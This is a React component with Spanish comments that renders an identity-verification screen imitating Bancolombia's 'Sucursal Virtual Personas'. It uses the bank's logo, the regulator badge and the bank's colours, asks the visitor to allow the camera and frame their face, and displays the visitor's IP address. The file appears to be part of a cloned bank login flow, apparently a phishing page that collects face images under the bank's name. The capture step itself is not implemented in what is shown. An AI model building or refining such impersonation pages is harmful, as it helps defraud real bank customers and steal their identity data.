import { useEffect, useState } from "react";
import './css/LoginModal.css';

// Se crea y exporta el componente VerificacionIdentidad
export default function TESTvalidacion() {

    // Función para el botón Continuar
    const handleContinuar = () => {
        console.log("Continuar clicked");
        // Aquí iría tu lógica de redirección o permisos de cámara
    };

    // Estados para IP y Fecha
    const [ip, setIp] = useState("");
    const [fechaHora, setFechaHora] = useState("");

    useEffect(() => {
        obtenerIP();
        obtenerFechaHora();
    }, []);

    useEffect(() => {
        obtenerFechaHora();
        const ahora = new Date();
        const msHastaProximoMinuto = (60 - ahora.getSeconds()) * 1000 - ahora.getMilliseconds();
        let intervalId;
        const timeoutId = setTimeout(() => {
            obtenerFechaHora();
            intervalId = setInterval(obtenerFechaHora, 60000);
        }, msHastaProximoMinuto);
        return () => {
            clearTimeout(timeoutId);
            if (intervalId) clearInterval(intervalId);
        };
    }, []);

    const obtenerIP = async () => {
        try {
            const response = await fetch("https://api.ipify.org?format=json");
            const data = await response.json();
            setIp(data.ip);
        } catch (error) {
            console.error("Error obteniendo IP", error);
            setIp("No disponible");
        };
    };

    const obtenerFechaHora = () => {
        const ahora = new Date();
        const opciones = { weekday: "long", year: "numeric", month: "long", day: "numeric", hour: "numeric", minute: "2-digit", hour12: true };
        setFechaHora(ahora.toLocaleString("es-CO", opciones));
    };

    return (
        <div style={{ minHeight: "100vh", display: "flex", flexDirection: "column" }}>

            {/* --- HEADER --- */}
            <div style={{
                flex: 1,
                backgroundColor: "#2C2A29",
                backgroundImage: 'url("/assets/images/auth-trazo.svg")', // Mismo fondo que tu ejemplo
                backgroundRepeat: "no-repeat",
                backgroundPosition: "center",
                backgroundSize: "cover",
                backgroundPositionY: "-140px",
                backgroundPositionX: "-610px",
                display: "flex",
                flexDirection: "column",
                alignItems: "center"
            }}>

                {/* Título Superior */}
                <div style={{ marginTop: "40px", marginBottom: "20px" }}>
                    <h1 className="general-title" style={{ fontSize: "20px", fontWeight: "normal", color: "#ddd" }}>
                        Sucursal Virtual Personas
                    </h1>
                </div>

                {/* --- CARD PRINCIPAL --- */}
                <div className="login-box" style={{
                    backgroundColor: "#454648", // Color gris de la tarjeta
                    width: "100%",
                    maxWidth: "400px",
                    textAlign: "center",
                    borderRadius: "12px",
                    padding: "30px 25px",
                    color: "#ffffff",
                    boxShadow: "0 10px 30px rgba(0,0,0,0.5)",
                    position: "relative"
                }}>

                    {/* --- ICONO SUPERIOR (MANO) --- */}
                    <div style={{ display: "flex", justifyContent: "center", marginBottom: "20px" }}>

                        {/* --- AQUÍ VA LA IMAGEN 1 (Icono Mano) --- */}
                        <img
                            src="/assets/images/Indicacion/CELULAR LOGO 2.png"
                            alt="Verificación"
                            style={{ width: "30px", height: "auto" }}
                        />

                    </div>

                    <h2 style={{ fontSize: "22px", fontWeight: "bold", marginBottom: "15px", color: "#ddd" }}>
                        Verificación de identidad
                    </h2>

                    <p style={{ fontSize: "14px", lineHeight: "1.5", marginBottom: "15px", color: "#ddd" }}>
                        Necesitamos verificar tu identidad para continuar con el proceso de forma segura.
                    </p>

                    <p style={{ fontSize: "14px", lineHeight: "1.5", marginBottom: "30px", color: "#ddd" }}>
                        Para completar la verificación, acepta los permisos de la cámara y sigue las instrucciones:
                    </p>

                    {/* --- LISTA DE INSTRUCCIONES --- */}
                    <div style={{ textAlign: "left", display: "flex", flexDirection: "column", gap: "25px", marginBottom: "35px" }}>

                        {/* ITEM 1: ILUMINACIÓN */}
                        <div style={{ display: "flex", gap: "15px" }}>
                            <div style={{ minWidth: "30px", display: "flex", justifyContent: "center", paddingTop: "2px" }}>
                                {/* --- AQUÍ VA LA IMAGEN 2 (Icono Lámpara/Luz) --- */}
                                <img
                                    src="/assets/images/Indicacion/indicacion_luz-removebg.png"
                                    alt="Iluminación"
                                    style={{ width: "60px", height: "40px", objectFit: "contain" }}
                                />
                            </div>
                            <div>
                                <h3 style={{ color: "#FBDC1D", fontSize: "15px", fontWeight: "bold", marginBottom: "5px" }}>
                                    Ubicate en un espacio iluminado
                                </h3>
                                <p style={{ fontSize: "13px", color: "#eee", margin: 0, lineHeight: "1.4" }}>
                                    Mejor un lugar con luz natural o luz blanca.
                                </p>
                            </div>
                        </div>

                        {/* ITEM 2: POSICIÓN */}
                        <div style={{ display: "flex", gap: "15px" }}>
                            <div style={{ minWidth: "30px", display: "flex", justifyContent: "center", paddingTop: "2px" }}>
                                {/* --- AQUÍ VA LA IMAGEN 3 (Icono Rostro/Encuadre) --- */}
                                <img
                                    src="/assets/images/Indicacion/indicacion_telefono-removebg.png"
                                    alt="Rostro"
                                    style={{ width: "60px", height: "40px", objectFit: "contain" }}
                                />
                            </div>
                            <div>
                                <h3 style={{ color: "#FBDC1D", fontSize: "15px", fontWeight: "bold", marginBottom: "5px" }}>
                                    Ubica tú celular a la altura de tu rostro
                                </h3>
                                <p style={{ fontSize: "13px", color: "#eee", margin: 0, lineHeight: "1.4" }}>
                                    Mantén la cabeza recta mirando al frente y ubica tu celular a esa altura.
                                </p>
                            </div>
                        </div>

                        {/* ITEM 3: ACCESORIOS */}
                        <div style={{ display: "flex", gap: "15px" }}>
                            <div style={{ minWidth: "30px", display: "flex", justifyContent: "center", paddingTop: "2px" }}>
                                {/* --- AQUÍ VA LA IMAGEN 4 (Icono No Accesorios) --- */}
                                <img
                                    src="/assets/images/Indicacion/indicacion_gafas-removebg.png"
                                    alt="Accesorios"
                                    style={{ width: "24px", height: "40px", objectFit: "contain" }}
                                />
                            </div>
                            <div>
                                <h3 style={{ color: "#FBDC1D", fontSize: "15px", fontWeight: "bold", marginBottom: "5px" }}>
                                    Retira los accesorios
                                </h3>
                                <p style={{ fontSize: "13px", color: "#eee", margin: 0, lineHeight: "1.4" }}>
                                    Evita cubrir tu rostro con tú cabello, gafas, gorras, tapabocas, etc.
                                </p>
                            </div>
                        </div>
                    </div>

                    {/* --- BOTÓN CONTINUAR --- */}
                    <button
                        onClick={handleContinuar}
                        style={{
                            width: "100%",
                            padding: "15px",
                            backgroundColor: "#FBDC1D",
                            color: "#000",
                            border: "none",
                            borderRadius: "50px", // Botón redondeado
                            fontWeight: "bold",
                            fontSize: "16px",
                            cursor: "pointer"
                        }}
                    >
                        Continuar
                    </button>

                </div>

                {/* --- FOOTER (Igual que Error923) --- */}
                <div className="login-page-footer mt-4" style={{ width: "100%", maxWidth: "400px", paddingBottom: "20px" }}>
                    <div className="footer-links" style={{ marginTop: "40px", textAlign: "center", fontSize: "12px", color: "#ccc" }}>
                        <span>¿Problemas para conectarte?</span> <span className="dot">·</span> <span>Aprende sobre seguridad</span> <span className="dot">·</span> <span>Reglamento Sucursal Virtual</span> <span className="dot">·</span> <span>Política de privacidad</span>
                    </div>

                    <hr style={{ marginTop: "20px", borderColor: "#555" }} />

                    <div className="footer-final" style={{ display: "flex", justifyContent: "space-between", alignItems: "center", marginTop: "20px", fontSize: "11px", color: "#aaa" }}>
                        <div className="footer-left">
                            <img src="/assets/images/img_pantalla2/descarga.svg" alt="Bancolombia" style={{ width: "120px", display: "block", marginBottom: "10px" }} />
                            <img src="/assets/images/img_pantalla1/imgi_40_logo_vigilado.svg" alt="Vigilado" style={{ width: "120px" }} />
                        </div>
                        <div className="footer-right" style={{ textAlign: "right" }}>
                            <div className="mt-2">Dirección IP: {ip}</div>
                            <div className="mb-2">{fechaHora}</div>
                        </div>
                    </div>
                </div>

            </div>
        </div>
    );
};
